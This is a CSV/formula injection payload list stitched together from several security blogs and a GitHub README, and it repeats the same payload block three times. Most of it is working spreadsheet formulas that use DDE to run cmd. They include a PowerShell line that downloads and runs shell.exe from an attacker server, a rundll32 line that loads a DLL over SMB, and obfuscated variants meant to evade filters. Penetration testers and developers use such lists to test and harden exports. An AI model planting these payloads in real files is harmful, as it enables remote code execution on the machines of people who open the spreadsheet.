
CSV Injection Payload List

##
#
https://systemweakness.com/csv-injection-payload-list-e8e1deca6da5
#
https://medium.com/@ghostxploiter/how-a-simple-spreadsheet-can-hack-your-computer-csv-injection-98f4a26c4957
#
https://book.hacktricks.xyz/pentesting-web/formula-csv-doc-latex-ghostscript-injection
#
##



CSV Injection
Many web applications allow the user to download content such as templates for invoices or user settings to a CSV file. Many users choose to open the CSV file in either Excel, Libre Office or Open Office. When a web application does not properly validate the contents of the CSV file, it could lead to contents of a cell or many cells being executed.
```
Exploit
Basic exploit with Dynamic Data Exchange

# pop a calc
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+1)*cmd|' /C calc'!A0
=2+5+cmd|' /C calc'!A0

# pop a notepad
=cmd|' /C notepad'!'A1'

# powershell download and execute
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0

# msf smb delivery with rundll32
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1

# Prefix obfuscation and command chaining
=AAAA+BBBB-CCCC&"Hello"/12345&cmd|'/c calc.exe'!A
=cmd|'/c calc.exe'!A*cmd|'/c calc.exe'!A
+thespanishinquisition(cmd|'/c calc.exe'!A
=         cmd|'/c calc.exe'!A

# Using rundll32 instead of cmd
=rundll32|'URL.dll,OpenURL calc.exe'!A
=rundll321234567890abcdefghijklmnopqrstuvwxyz|'URL.dll,OpenURL calc.exe'!A

# Using null characters to bypass dictionary filters. Since they are not spaces, they are ignored when executed.
=    C    m D                    |        '/        c       c  al  c      .  e                  x       e  '   !   A
Technical Details of the above payload:

cmd is the name the server can respond to whenever a client is trying to access the server
/C calc is the file name which in our case is the calc(i.e the calc.exe)
!A0 is the item name that specifies unit of data that a server can respond when the client is requesting the data
Any formula can be started with
```
=
+
–
@
References
OWASP - CSV Excel Macro Injection
Google Bug Hunter University - CSV Excel formula injection
CSV INJECTION: BASIC TO EXPLOIT!!!! - 30/11/2017 - Akansha Kesharwani
From CSV to Meterpreter - 5th November 2015 - Adam Chester
The Absurdly Underestimated Dangers of CSV Injection - 7 October, 2017 - George Mauer
Three New DDE Obfuscation Methods
Your Excel Sheets Are Not Safe! Here's How to Beat CSV Injection

##
##
##



Screenshot on CSV Injection Attack
CSV injection is a type of cyber attack in which an attacker attempts to inject malicious data into a CSV file. This can happen if the application that processes the CSV file does not properly validate the input, allowing the attacker to insert arbitrary content into the file. The attacker may then be able to manipulate the data in the file, potentially leading to security breaches or other problems. To prevent CSV injection attacks, it is important to always validate user input and ensure that it is free from any malicious content before processing it. This can be done using a variety of techniques, such as input sanitization and filtering.

Payloads :
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
Sources to be read :
https://www.we45.com/blog/2017/02/14/csv-injection-theres-devil-in-the-detail
https://payatu.com/csv-injection-basic-to-exploit
https://www.veracode.com/blog/secure-development/data-extraction-command-execution-csv-injection
Examples from the real world :

https://hackerone.com/reports/118582
https://hackerone.com/reports/223344
https://hackerone.com/reports/126109
https://hackerone.com/reports/386116
https://hackerone.com/reports/459532
https://hackerone.com/reports/335447
https://hackerone.com/reports/219323
https://hackerone.com/reports/216243
https://hackerone.com/reports/282628
References :
CSV Injection :

👉 https://owasp.org/www-community/attacks/CSV_Injection
Cloning an Existing Repository ( Clone with HTTPS )

root@ismailtasdelen:~# git clone https://github.com/payloadbox/csv-injection-payloads.git
Cloning an Existing Repository ( Clone with SSH )

root@ismailtasdelen:~# git clone git@github.com:payloadbox/csv-injection-payloads.git
GitHub : https://github.com/payloadbox/csv-injection-payloads



```
CSV Injection Payloads
     

CSV Injection, also known as Formula Injection, occurs when websites embed untrusted input inside CSV files.

Payloads :
=DDE("cmd";"/C calc";"!A0")A0
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
References :
CSV Injection :
👉 https://owasp.org/www-community/attacks/CSV_Injection
Cloning an Existing Repository ( Clone with HTTPS )
root@ismailtasdelen:~# git clone https://github.com/payloadbox/csv-injection-payloads.git
Cloning an Existing Repository ( Clone with SSH )
root@ismailtasdelen:~# git clone git@github.com:payloadbox/csv-injection-payloads.git
Donate!
